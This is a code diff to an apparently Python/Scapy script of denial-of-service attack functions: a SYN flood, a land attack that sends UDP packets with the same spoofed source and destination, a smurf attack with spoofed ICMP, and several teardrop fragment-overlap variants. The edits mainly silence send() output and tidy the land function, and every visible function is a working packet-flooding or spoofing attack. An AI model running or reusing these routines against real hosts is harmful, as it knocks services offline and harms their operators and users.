@@ -25,7 +25,7 @@ def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=100
     while count < packets_send:
         # Creates the packet and assigns it to variable a
         a = IP(src=src_ip, dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
-        send(a)  # Sends the Packet
+        send(a, verbose=False)
         count = count + 1
         # print(str(count) + " Packets Sent")
 
@@ -37,10 +37,12 @@ def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=100
 
 # Denial of service where a remote host is sent a UDP packet with the
 # same source and destination
-def land(target_ip, target_port, src="192.168.147.150", packets_send=1000):
+def land(target_ip, target_port, packets_send=1000):
     count = 0
     while count < packets_send:
-        send(IP(src=target_ip, dst=target_ip) / UDP(sport=target_port, dport=target_port))
+        i = IP(src=target_ip, dst=target_ip)
+        u = UDP(sport=int(target_port), dport=int(target_port))
+        send(i / u, verbose=False)
         count = count + 1
     print("Land attack complete!")
 
@@ -57,7 +59,7 @@ def pod(target_ip, src_ip="192.168.147.152"):
 def smurf(source_ip, target_ip, packets_send=10000):
     count = 0
     while count < packets_send:
-        send(IP(src=source_ip, dst=target_ip, ttl=50) / ICMP())
+        send(IP(src=source_ip, dst=target_ip, ttl=50) / ICMP(), verbose=False)
         count = count + 1
     print("Land attack complete!")
 
@@ -96,8 +98,8 @@ def teardrop(target, attack, src_ip="192.168.147.153"):
         j.frag = offset
         j.src = src_ip
 
-        send(i / load1)
-        send(j / load2)
+        send(i / load1, verbose=False)
+        send(j / load2, verbose=False)
 
     elif attack == '1':
         print("Using attack 1")
@@ -118,8 +120,8 @@ def teardrop(target, attack, src_ip="192.168.147.153"):
         j.frag = offset
         j.src = src_ip
 
-        send(i / load)
-        send(j / load)
+        send(i / load, verbose=False)
+        send(j / load, verbose=False)
 
     elif attack == '2':
         print("Using attack 2")
@@ -171,8 +173,8 @@ def teardrop(target, attack, src_ip="192.168.147.153"):
         j.frag = offset
         j.src = src_ip
 
-        send(i / load1)
-        send(j / load2)
+        send(i / load1, verbose=False)
+        send(j / load2, verbose=False)
 
     else:  # attack == 4
         print("Using attack 4")
@@ -193,8 +195,8 @@ def teardrop(target, attack, src_ip="192.168.147.153"):
         j.frag = offset
         j.src = src_ip
 
-        send(i / load)
-        send(j / load)
+        send(i / load, verbose=False)
+        send(j / load, verbose=False)
 
     print("Done Executing Teardrop!!")
 
